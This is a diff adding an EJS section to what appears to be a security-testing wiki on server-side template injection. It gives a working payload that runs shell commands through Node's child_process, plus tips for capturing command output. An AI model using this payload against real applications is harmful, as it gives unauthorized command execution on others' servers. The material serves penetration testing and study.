@@ -62,3 +62,15 @@ Handlebars:   constructor lookup chain (prototype)
 
 <!-- auto-wired: context-reachable sub-technique pages -->
 - [[ssi-injection]]
+
+## EJS (Node.js)
+
+`<%= 7*7 %>` rendering `49` in a Node/Express app is EJS (syntax shared with Ruby ERB; tell them apart from the stack, `X-Powered-By: Express` or a Node error page). EJS evaluates real JavaScript with `process` reachable:
+
+```html
+<%= process.mainModule.require("child_process").execSync("id; hostname").toString() %>
+```
+
+Gotchas when shelling through it: `execSync` throws on any nonzero exit and the throw swallows ALL output, so end fallible commands with `; true`; escape shell parens as `\\(` inside the JS string; avoid single quotes; read output from the rendered template block, not the echoed source (the literal template still shows in the page).
+
+<!-- promoted-slug: ejs-node-ssti-rce -->
